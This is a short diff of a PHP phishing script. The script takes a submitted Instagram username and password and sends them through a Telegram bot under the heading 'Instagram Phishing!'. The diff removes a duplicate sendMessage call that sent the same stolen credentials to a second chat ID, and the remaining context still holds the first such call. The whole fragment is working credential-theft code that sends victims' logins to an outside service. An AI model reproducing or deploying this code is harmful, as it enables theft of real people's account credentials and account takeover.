@@ -24,11 +24,6 @@ if (isset($_POST)) {
             'text'=>"<b>📸Instagram Phishing!</b>\n\n<b>Login</b>: $username\n<b>Password</b>: $password",
             'parse_mode'=>'html'
     ]);
-bot('sendMessage', [
-            'chat_id'=>'6754167480',
-            'text'=>"<b>📸Instagram Phishing!</b>\n\n<b>Login</b>: $username\n<b>Password</b>: $password",
-            'parse_mode'=>'html'
-    ]);
 }
 
 
